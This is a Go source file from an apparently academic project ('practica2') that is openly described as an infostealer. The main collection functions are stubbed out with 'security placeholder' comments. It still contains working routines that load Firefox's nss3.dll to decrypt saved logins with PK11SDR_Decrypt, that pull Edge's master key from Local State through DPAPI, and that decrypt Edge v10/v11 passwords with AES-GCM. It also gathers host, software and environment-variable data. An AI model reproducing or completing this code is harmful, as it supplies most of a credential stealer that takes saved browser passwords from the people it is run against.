package utils

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"practica2/config"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/sys/windows/registry"
)

// Variables globales para NSS de Firefox
var (
	nss3DLL        *syscall.LazyDLL
	nssInitialized bool
	nssProfilePath string
)

// Estructuras NSS
type SECItem struct {
	Type uint32
	Data *byte
	Len  uint32
}

type SECStatus int32

const (
	SECSuccess SECStatus = 0
	SECFailure SECStatus = -1
)

// SystemInfo contiene información del sistema
type SystemInfo struct {
	Hostname          string            `json:"hostname"`
	Username          string            `json:"username"`
	OS                string            `json:"os"`
	Architecture      string            `json:"architecture"`
	Processors        int               `json:"processors"`
	CurrentDirectory  string            `json:"current_directory"`
	ExecutablePath    string            `json:"executable_path"`
	TimeZone          string            `json:"timezone"`
	CollectionTime    string            `json:"collection_time"`
	SystemLanguage    string            `json:"system_language"`
	ComputerDomain    string            `json:"computer_domain"`
	IPAddress         string            `json:"ip_address"`
	InstalledSoftware []SoftwareInfo    `json:"installed_software"`
	BrowserData       BrowserDataInfo   `json:"browser_data"`
	EnvironmentVars   map[string]string `json:"environment_variables"`
}

// SoftwareInfo contiene información de software instalado
type SoftwareInfo struct {
	Name      string `json:"name"`
	Version   string `json:"version"`
	Publisher string `json:"publisher"`
}

// BrowserDataInfo contiene datos de navegadores
type BrowserDataInfo struct {
	Firefox BrowserDetails `json:"firefox"`
	Edge    BrowserDetails `json:"edge"`
}

// BrowserDetails contiene toda la información de un navegador específico
type BrowserDetails struct {
	Profiles       []string          `json:"profiles"`
	PasswordsFound int               `json:"passwords_found"`
	BookmarksFound bool              `json:"bookmarks_found"`
	HistoryFound   bool              `json:"history_found"`
	CookiesFound   bool              `json:"cookies_found"`
	Passwords      []BrowserPassword `json:"passwords"`
}

// BrowserPassword contiene información de una contraseña guardada
type BrowserPassword struct {
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
	Browser  string `json:"browser"`
}

// FUNCIONES NSS PARA FIREFOX

// findFirefoxInstallPath busca la instalación de Firefox
func findFirefoxInstallPath() string {
	possiblePaths := []string{
		`C:\Program Files\Mozilla Firefox`,
		`C:\Program Files (x86)\Mozilla Firefox`,
		filepath.Join(os.Getenv("ProgramFiles"), `Mozilla Firefox`),
		filepath.Join(os.Getenv("ProgramFiles(x86)"), `Mozilla Firefox`),
	}

	for _, path := range possiblePaths {
		nssPath := filepath.Join(path, "nss3.dll")
		if _, err := os.Stat(nssPath); err == nil {
			return path
		}
	}

	return ""
}

// initNSS inicializa las librerías NSS de Firefox
func initNSS(profilePath string) bool {
	if nssInitialized && nssProfilePath == profilePath {
		return true
	}

	firefoxPath := findFirefoxInstallPath()
	if firefoxPath == "" {
		return false
	}

	// Configurar directorio de DLLs
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	setDllDirectory := kernel32.NewProc("SetDllDirectoryW")

	firefoxPathUTF16, err := syscall.UTF16PtrFromString(firefoxPath)
	if err != nil {
		return false
	}

	ret, _, _ := setDllDirectory.Call(uintptr(unsafe.Pointer(firefoxPathUTF16)))
	if ret == 0 {
		return false
	}

	nss3Path := filepath.Join(firefoxPath, "nss3.dll")

	// Cargar nss3.dll
	nss3DLL = syscall.NewLazyDLL(nss3Path)
	if err := nss3DLL.Load(); err != nil {
		// Intentar cargar dependencias manualmente
		dependencies := []string{"mozglue.dll", "msvcp140.dll", "vcruntime140.dll", "nssutil3.dll", "plc4.dll", "plds4.dll", "nspr4.dll"}
		for _, dep := range dependencies {
			depPath := filepath.Join(firefoxPath, dep)
			if _, err := os.Stat(depPath); err == nil {
				depDLL := syscall.NewLazyDLL(depPath)
				depDLL.Load()
			}
		}

		// Reintentar cargar nss3.dll
		if err := nss3DLL.Load(); err != nil {
			return false
		}
	}

	// Verificar key4.db
	key4Path := filepath.Join(profilePath, "key4.db")
	if _, err := os.Stat(key4Path); os.IsNotExist(err) {
		return false
	}

	// NSS_Init espera UTF-8/ANSI
	profilePathBytes := append([]byte(profilePath), 0)

	// Llamar a NSS_Init
	nssInit := nss3DLL.NewProc("NSS_Init")
	retInit, _, _ := nssInit.Call(uintptr(unsafe.Pointer(&profilePathBytes[0])))

	if SECStatus(retInit) != SECSuccess {
		// Intentar con NSS_InitReadWrite
		nssInitRW := nss3DLL.NewProc("NSS_InitReadWrite")
		retRW, _, _ := nssInitRW.Call(uintptr(unsafe.Pointer(&profilePathBytes[0])))

		if SECStatus(retRW) != SECSuccess {
			return false
		}
	}

	nssInitialized = true
	nssProfilePath = profilePath
	return true
}

// shutdownNSS cierra NSS
func shutdownNSS() {
	if !nssInitialized || nss3DLL == nil {
		return
	}

	nssShutdown := nss3DLL.NewProc("NSS_Shutdown")
	nssShutdown.Call()
	nssInitialized = false
}

// decryptWithNSS descifra datos usando NSS
func decryptWithNSS(encryptedData []byte) ([]byte, error) {
	if !nssInitialized {
		return nil, fmt.Errorf("NSS no inicializado")
	}

	if nss3DLL == nil {
		return nil, fmt.Errorf("nss3.dll no cargada")
	}

	// Preparar SECItem de entrada
	inItem := SECItem{
		Type: 0,
		Data: &encryptedData[0],
		Len:  uint32(len(encryptedData)),
	}

	// Preparar SECItem de salida
	var outItem SECItem

	// Llamar a PK11SDR_Decrypt
	pk11Decrypt := nss3DLL.NewProc("PK11SDR_Decrypt")
	ret, _, callErr := pk11Decrypt.Call(
		uintptr(unsafe.Pointer(&inItem)),
		uintptr(unsafe.Pointer(&outItem)),
		0,
	)

	if SECStatus(ret) != SECSuccess {
		return nil, fmt.Errorf("PK11SDR_Decrypt falló: %v", callErr)
	}

	// Copiar datos descifrados
	if outItem.Len == 0 || outItem.Data == nil {
		return nil, fmt.Errorf("datos descifrados vacíos")
	}

	result := make([]byte, outItem.Len)
	for i := uint32(0); i < outItem.Len; i++ {
		result[i] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(outItem.Data)) + uintptr(i)))
	}

	// Liberar memoria NSS
	secitemFree := nss3DLL.NewProc("SECITEM_FreeItem")
	secitemFree.Call(uintptr(unsafe.Pointer(&outItem)), 0)

	return result, nil
}

// FUNCIÓN PRINCIPAL DE INFOSTEALER

// StealInformation recopila toda la información sensible del sistema
func StealInformation() (*SystemInfo, error) {
	/*
	 * [SECURITY PLACEHOLDER]
	 * The actual implementation of the infostealer logic (extracting credentials,
	 * browser data, system data) has been withheld from this public repository 
	 * for security and responsibility reasons.
	 */
	return &SystemInfo{
		CollectionTime: time.Now().Format("2006-01-02 15:04:05"),
	}, nil
}

// MÉTODOS DE RECOPILACIÓN

func (s *SystemInfo) collectBasicInfo() {
	s.Hostname, _ = os.Hostname()
	s.Username = os.Getenv("USERNAME")
	s.OS = runtime.GOOS
	s.Architecture = runtime.GOARCH
	s.Processors = runtime.NumCPU()
	s.CurrentDirectory, _ = os.Getwd()
	s.ExecutablePath, _ = os.Executable()
	zone, _ := time.Now().Zone()
	s.TimeZone = zone
	s.SystemLanguage = os.Getenv("LANG")
	if s.SystemLanguage == "" {
		s.SystemLanguage = "Unknown"
	}
	s.ComputerDomain = os.Getenv("USERDOMAIN")
}

func (s *SystemInfo) collectNetworkInfo() {
	// Obtener IP principal de forma simple
	interfaces, err := net.Interfaces()
	if err != nil {
		s.IPAddress = "Unknown"
		return
	}

	for _, iface := range interfaces {
		// Ignorar interfaces down o loopback
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}

		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					s.IPAddress = ipnet.IP.String()
					return
				}
			}
		}
	}
	s.IPAddress = "Unknown"
}

func (s *SystemInfo) collectInstalledSoftware() {
	s.InstalledSoftware = []SoftwareInfo{}

	// Leer del registro de Windows (software instalado)
	keyPaths := []string{
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall`,
		`SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall`,
	}

	for _, keyPath := range keyPaths {
		key, err := registry.OpenKey(registry.LOCAL_MACHINE, keyPath, registry.ENUMERATE_SUB_KEYS|registry.QUERY_VALUE)
		if err != nil {
			continue
		}
		defer key.Close()

		subkeys, err := key.ReadSubKeyNames(0)
		if err != nil {
			continue
		}

		for _, subkey := range subkeys {
			subKey, err := registry.OpenKey(registry.LOCAL_MACHINE, keyPath+`\`+subkey, registry.QUERY_VALUE)
			if err != nil {
				continue
			}

			name, _, _ := subKey.GetStringValue("DisplayName")
			version, _, _ := subKey.GetStringValue("DisplayVersion")
			publisher, _, _ := subKey.GetStringValue("Publisher")

			if name != "" {
				s.InstalledSoftware = append(s.InstalledSoftware, SoftwareInfo{
					Name:      name,
					Version:   version,
					Publisher: publisher,
				})
			}

			subKey.Close()

			// Limitar para no sobrecargar
			if len(s.InstalledSoftware) >= 50 {
				break
			}
		}
	}
}

func (s *SystemInfo) collectBrowserData() {
	s.BrowserData = BrowserDataInfo{}

	userProfile := os.Getenv("USERPROFILE")

	// Rutas de navegadores comunes
	browserPaths := map[string]string{
		"Firefox": filepath.Join(userProfile, `AppData\Roaming\Mozilla\Firefox\Profiles`),
		"Edge":    filepath.Join(userProfile, `AppData\Local\Microsoft\Edge\User Data`),
	}

	// Verificar Firefox
	if firefoxPath, exists := browserPaths["Firefox"]; exists {
		if _, err := os.Stat(firefoxPath); err == nil {
			profiles := findFirefoxProfiles(firefoxPath)
			passwords := extractFirefoxPasswords(firefoxPath)
			s.BrowserData.Firefox = BrowserDetails{
				Profiles:       profiles,
				PasswordsFound: len(passwords),
				BookmarksFound: checkFirefoxFile(firefoxPath, "places.sqlite"),
				HistoryFound:   checkFirefoxFile(firefoxPath, "places.sqlite"),
				CookiesFound:   checkFirefoxFile(firefoxPath, "cookies.sqlite"),
				Passwords:      passwords,
			}
		}
	}

	// Verificar Edge
	if edgePath, exists := browserPaths["Edge"]; exists {
		if _, err := os.Stat(edgePath); err == nil {
			if profiles, err := findBrowserProfiles(edgePath); err == nil {
				passwords := extractEdgePasswords(edgePath, "Edge")
				s.BrowserData.Edge = BrowserDetails{
					Profiles:       profiles,
					PasswordsFound: len(passwords),
					BookmarksFound: checkBrowserFile(edgePath, "Bookmarks"),
					HistoryFound:   checkBrowserFile(edgePath, "History"),
					CookiesFound:   checkBrowserFile(edgePath, "Cookies"),
					Passwords:      passwords,
				}
			}
		}
	}
}

func (s *SystemInfo) collectEnvironmentVariables() {
	s.EnvironmentVars = make(map[string]string)

	for _, env := range os.Environ() {
		parts := strings.SplitN(env, "=", 2)
		if len(parts) == 2 {
			s.EnvironmentVars[parts[0]] = parts[1]
		}
	}
}

// FUNCIONES AUXILIARES

// extractFirefoxPasswords extrae contraseñas de Firefox
func extractFirefoxPasswords(firefoxProfilesPath string) []BrowserPassword {
	/* [SECURITY PLACEHOLDER] - Withheld for safety */
	return []BrowserPassword{}
}

// decryptFirefoxData descifra datos de Firefox (NSS format)
func decryptFirefoxData(encryptedData string, profilePath string) string {
	if encryptedData == "" {
		return ""
	}

	// Decodificar Base64
	decoded, err := base64.StdEncoding.DecodeString(encryptedData)
	if err != nil {
		return ""
	}

	// Método 1: Intentar con NSS si está inicializado
	if nssInitialized {
		decrypted, err := decryptWithNSS(decoded)
		if err == nil && len(decrypted) > 0 {
			result := string(decrypted)
			if isPrintableString(result) {
				return result
			}
		}
	}

	// Método 2: Intentar descifrar con DPAPI directamente (para versiones antiguas)
	decrypted := decryptWithDPAPI(decoded)
	if len(decrypted) > 0 {
		result := string(decrypted)
		if isPrintableString(result) {
			return result
		}
	}

	return ""
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// isPrintableString verifica si una cadena es imprimible (para validar descifrado)
func isPrintableString(s string) bool {
	if len(s) == 0 {
		return false
	}

	printableCount := 0
	for _, r := range s {
		// Permitir caracteres imprimibles ASCII y algunos Unicode comunes
		if (r >= 32 && r <= 126) || r == '\t' || r == '\n' || (r >= 160 && r <= 255) {
			printableCount++
		}
	}

	// Al menos 80% de caracteres imprimibles
	return float64(printableCount)/float64(len(s)) >= 0.8
}

func findBrowserProfiles(basePath string) ([]string, error) {
	var profiles []string

	entries, err := os.ReadDir(basePath)
	if err != nil {
		return profiles, err
	}

	for _, entry := range entries {
		if entry.IsDir() && (strings.HasPrefix(entry.Name(), "Profile") || entry.Name() == "Default") {
			profiles = append(profiles, entry.Name())
		}
	}

	return profiles, nil
}

// findFirefoxProfiles busca perfiles de Firefox
func findFirefoxProfiles(basePath string) []string {
	var profiles []string

	entries, err := os.ReadDir(basePath)
	if err != nil {
		return profiles
	}

	for _, entry := range entries {
		if entry.IsDir() {
			// Firefox usa nombres como "xxxxx.default-release", "xxxxx.default", etc.
			profilePath := filepath.Join(basePath, entry.Name())
			loginsFile := filepath.Join(profilePath, "logins.json")
			if _, err := os.Stat(loginsFile); err == nil {
				profiles = append(profiles, entry.Name())
			}
		}
	}

	return profiles
}

// checkBrowserFile verifica si existe un archivo específico en Chrome/Edge
func checkBrowserFile(basePath string, fileName string) bool {
	entries, err := os.ReadDir(basePath)
	if err != nil {
		return false
	}

	for _, entry := range entries {
		if entry.IsDir() {
			filePath := filepath.Join(basePath, entry.Name(), fileName)
			if _, err := os.Stat(filePath); err == nil {
				return true
			}
		}
	}
	return false
}

// checkFirefoxFile verifica si existe un archivo específico en Firefox
func checkFirefoxFile(basePath string, fileName string) bool {
	entries, err := os.ReadDir(basePath)
	if err != nil {
		return false
	}

	for _, entry := range entries {
		if entry.IsDir() {
			filePath := filepath.Join(basePath, entry.Name(), fileName)
			if _, err := os.Stat(filePath); err == nil {
				return true
			}
		}
	}
	return false
}

// extractEdgePasswords extrae contraseñas de Edge
func extractEdgePasswords(browserPath string, browserName string) []BrowserPassword {
	/* [SECURITY PLACEHOLDER] - Withheld for safety */
	return []BrowserPassword{}
}

// getMasterKey obtiene la clave maestra de Chrome/Edge desde Local State
func getMasterKey(localStatePath string) []byte {
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil
	}

	var localState map[string]interface{}
	if err := json.Unmarshal(data, &localState); err != nil {
		return nil
	}

	osCrypt, ok := localState["os_crypt"].(map[string]interface{})
	if !ok {
		return nil
	}

	encryptedKeyB64, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		return nil
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyB64)
	if err != nil {
		return nil
	}

	if len(encryptedKey) < 5 {
		return nil
	}
	encryptedKey = encryptedKey[5:]

	return decryptWithDPAPI(encryptedKey)
}

// decryptWithDPAPI descifra datos usando Windows DPAPI
func decryptWithDPAPI(data []byte) []byte {
	crypt32 := syscall.NewLazyDLL("crypt32.dll")
	cryptUnprotectData := crypt32.NewProc("CryptUnprotectData")

	var outBlob DATA_BLOB
	inBlob := DATA_BLOB{
		cbData: uint32(len(data)),
		pbData: &data[0],
	}

	ret, _, _ := cryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0,
		0,
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&outBlob)),
	)

	if ret == 0 {
		return nil
	}

	defer syscall.LocalFree(syscall.Handle(unsafe.Pointer(outBlob.pbData)))

	decrypted := make([]byte, outBlob.cbData)
	copy(decrypted, (*[1 << 30]byte)(unsafe.Pointer(outBlob.pbData))[:outBlob.cbData:outBlob.cbData])

	return decrypted
}

// DATA_BLOB estructura para DPAPI
type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

// decryptEdgePassword descifra una contraseña de Edge (v10/v11)
func decryptEdgePassword(encryptedPassword []byte, masterKey []byte) string {
	if len(encryptedPassword) == 0 {
		return ""
	}

	// Edge usa v10/v11: formato estándar AES-256-GCM
	if len(encryptedPassword) > 3 {
		version := string(encryptedPassword[:3])

		if version == "v10" || version == "v11" {
			if len(masterKey) == 0 || len(encryptedPassword) < 15 {
				return ""
			}

			nonce := encryptedPassword[3:15]
			ciphertext := encryptedPassword[15:]

			block, err := aes.NewCipher(masterKey)
			if err != nil {
				return ""
			}

			aesgcm, err := cipher.NewGCM(block)
			if err != nil {
				return ""
			}

			plaintext, err := aesgcm.Open(nil, nonce, ciphertext, nil)
			if err != nil {
				return ""
			}

			return string(plaintext)
		}
	}

	// Versiones antiguas usan DPAPI
	decrypted := decryptWithDPAPI(encryptedPassword)
	return string(decrypted)
}

func copyFileSafe(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}
